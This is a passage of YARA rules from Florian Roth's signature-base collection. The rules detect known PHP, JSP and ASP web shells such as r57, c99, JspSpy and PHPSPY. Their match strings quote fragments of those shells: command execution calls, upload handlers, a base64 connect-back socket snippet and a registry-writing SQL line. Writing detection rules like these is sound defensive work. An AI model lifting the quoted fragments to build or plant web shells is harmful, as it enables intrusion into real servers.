rule SIGNATURE_BASE_Webshell_400_In_Jfolder_Jfolder01_Jsp_Leo_Warn_Webshell_Nc
{
	meta:
		description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2664-L2688"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "74e31e51f2cb46a042e8591ffb44fe68fb591d202c8171c6afb556eddb381f6f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "36331f2c81bad763528d0ae00edf55be"
		hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash2 = "8979594423b68489024447474d113894"
		hash3 = "ec482fc969d182e5440521c913bab9bd"
		hash4 = "f98d2b33cd777e160d1489afed96de39"
		hash5 = "4b4c12b3002fad88ca6346a873855209"
		hash6 = "e9a5280f77537e23da2545306f6a19ad"
		hash7 = "598eef7544935cf2139d1eada4375bb5"

	strings:
		$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
		$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
		$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
		$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Gfs_Sh_R57Shell_R57Shell127_Sniper_SA_Xxx
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2737-L2762"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "24d93f9ae5e174873a32abdf8dca6c00f03cbb4c5e2ad531ac7fa34f8fc90794"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
		hash1 = "ef43fef943e9df90ddb6257950b3538f"
		hash2 = "ae025c886fbe7f9ed159f49593674832"
		hash3 = "911195a9b7c010f61b66439d9048f400"
		hash4 = "697dae78c040150daff7db751fc0c03c"
		hash5 = "513b7be8bd0595c377283a7c87b44b2e"
		hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash9 = "41af6fd253648885c7ad2ed524e0692d"
		hash10 = "6fcc283470465eed4870bcc3e2d7f14d"

	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Itsec_Phpjackal_Itsecteam_Shell_Jhn
{
	meta:
		description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2763-L2782"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0c97731c28f59a6fbab2b7882fae171da8d71add73ec92ab6093dec57fcd7207"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "e2830d3286001d1455479849aacbbb38"
		hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash3 = "40c6ecf77253e805ace85f119fe1cebb"

	strings:
		$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
		$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
		$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_Xxx1
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2804-L2823"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "95d25e9dc75a9af91e23b8c53acb384616f5d8a78605200bdb94f016a7f160f6"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "f3ca29b7999643507081caab926e2e74"
		hash2 = "527cf81f9272919bf872007e21c4bdda"

	strings:
		$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
		$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
		$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
		$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_He1P_Jspspy_Nogfw_Ok_Style_1_Jspspy1
{
	meta:
		description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2899-L2922"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "522ba5f797e33c27fef3ae8d89889c31799073ed3c770a49401f4d42ead04640"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b330a6c2d49124ef0729539761d6ef0b"
		hash1 = "d71716df5042880ef84427acee8b121e"
		hash2 = "344f9073576a066142b2023629539ebd"
		hash3 = "32dea47d9c13f9000c4c807561341bee"
		hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash5 = "3ea688e3439a1f56b16694667938316d"
		hash6 = "2434a7a07cb47ce25b41d30bc291cacc"

	strings:
		$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
		$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
		$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
		$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_R57Shell127_R57_Ifx_R57_Kartal_R57_Antichat
{
	meta:
		description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2966-L2987"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "23887963068f7dd2e4c85b11079276a00786d1a753f22e3b63f01139087a7f4c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "513b7be8bd0595c377283a7c87b44b2e"
		hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash4 = "3f71175985848ee46cc13282fbed2269"

	strings:
		$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
		$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
		$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
		$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_000_403_807_A_C5_Config_Css_Dm_He1P_Xxx
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3008-L3058"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "46eede3a1af29e344ed5107fc0af4bd13cd1492bff340d61063911bbb474e7b3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "6acc82544be056580c3a1caaa4999956"
		hash23 = "6aa32a6392840e161a018f3907a86968"
		hash24 = "591ca89a25f06cf01e4345f98a22845c"
		hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash26 = "3ea688e3439a1f56b16694667938316d"
		hash27 = "ab77e4d1006259d7cbc15884416ca88c"
		hash28 = "71097537a91fac6b01f46f66ee2d7749"
		hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash30 = "7a4b090619ecce6f7bd838fe5c58554b"

	strings:
		$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
		$s4 = "URL downUrl = new URL(downFileUrl);" fullword
		$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
		$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
		$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
		$s8 = "URLConnection conn = downUrl.openConnection();" fullword
		$s9 = "sis = request.getInputStream();" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Webshell_2_520_Icesword_Job_Ma1
{
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3059-L3079"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "795eb586310d87a3c6b53117bf2c8cbcfadcb177f5a5129c17fd21f0b64c385c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"

	strings:
		$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
		$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
		$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_404_Data_In_Jfolder_Jfolder01_Jsp_Suiyue_Warn
{
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3080-L3104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5e0da29499d76539fb1f5cfbe0a00331eeb0bb8fa861f2e2d686130ee4939fac"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash7 = "e9a5280f77537e23da2545306f6a19ad"

	strings:
		$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
		$s2 = " KB </td>" fullword
		$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
		$s4 = "<!-- <tr align=\"center\"> " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Phpspy_2005_Full_Phpspy_2005_Lite_Phpspy_2006_PHPSPY
{
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3106-L3126"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "fc47a50c5964574fb9b9caf3fb94041f028998577bf4ccf21884a41fa1876572"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "40a1f840111996ff7200d18968e42cfe"
		hash3 = "0712e3dc262b4e1f98ed25760b206836"

	strings:
		$s4 = "http://www.4ngel.net" fullword
		$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
		$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
		$s9 = "Codz by Angel" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_C99_Locus7S_C99_W4Cking_Xxx
{
	meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3127-L3156"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4afadac41e729f77711eb3ea3ee8f6e8ce61e19294e90db024e5334e214d9647"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
		hash1 = "9c34adbc8fd8d908cbb341734830f971"
		hash2 = "ef43fef943e9df90ddb6257950b3538f"
		hash3 = "ae025c886fbe7f9ed159f49593674832"
		hash4 = "911195a9b7c010f61b66439d9048f400"
		hash5 = "697dae78c040150daff7db751fc0c03c"
		hash6 = "513b7be8bd0595c377283a7c87b44b2e"
		hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
		hash12 = "41af6fd253648885c7ad2ed524e0692d"
		hash13 = "6fcc283470465eed4870bcc3e2d7f14d"

	strings:
		$s1 = "$res = @shell_exec($cfe);" fullword
		$s8 = "$res = @ob_get_contents();" fullword
		$s9 = "@exec($cfe,$res);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Browser_201_3_Ma_Ma2_Download
{
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3157-L3178"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "3b8bb6ca2eb146f8c170d629612ba12d4663445d443b681f2859af25d50ab6fe"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "4b45715fa3fa5473640e17f49ef5513d"
		hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"

	strings:
		$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
		$s2 = "private static String tempdir = \".\";" fullword
		$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_000_403_C5_Querydong_Spyjsp2010
{
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3179-L3200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "dd01bb059d741fedaee17d46355c7cd8a845d714b20ae37db36424544b954d2f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"

	strings:
		$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
		$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
		$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
		$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_R57Shell127_R57_Kartal_R57
{
	meta:
		description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3201-L3219"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "fd849f76f8348ee57a9c96eed91c8cac416fdc45a08c93e93ebc952375de27a3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash2 = "4108f28a9792b50d95f95b9e5314fa1e"

	strings:
		$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
		$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
		$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Con2
{
	meta:
		description = "Web shells - generated from file con2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3221-L3235"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d3584159ab299d546bd77c9654932ae3"
		logic_hash = "c681b04a1ee4d6af3275b6d772ef35f8bc888a5fcaf3b84f29f77c264e8ad9b9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
		$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Make2
{
	meta:
		description = "Web shells - generated from file make2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3236-L3249"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9af195491101e0816a263c106e4c145e"
		logic_hash = "7c94c925b5fd7fbc37428c21a9ea3c5a73f4fa0a20a1f5d03f0d5a990bd6f45a"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Aaa
{
	meta:
		description = "Web shells - generated from file aaa.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3250-L3265"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "68483788ab171a155db5266310c852b2"
		logic_hash = "3c5b9dd86dc790b03a8540b2fb3a717c5ad17d34f366a319faa127479387eed9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
		$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
		$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Expdoor_Com_ASP
{
	meta:
		description = "Web shells - generated from file Expdoor.com ASP.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3266-L3283"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "caef01bb8906d909f24d1fa109ea18a7"
		logic_hash = "838edb9d718b5e1a8be155c4569b4a291b37337e71b435c2b1cd6bcaa53c0dea"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\">www.Expdoor.com</a>" fullword
		$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
		$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
		$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
		$s16 = "<TITLE>Expdoor.com ASP" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Php2
{
	meta:
		description = "Web shells - generated from file php2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3284-L3297"
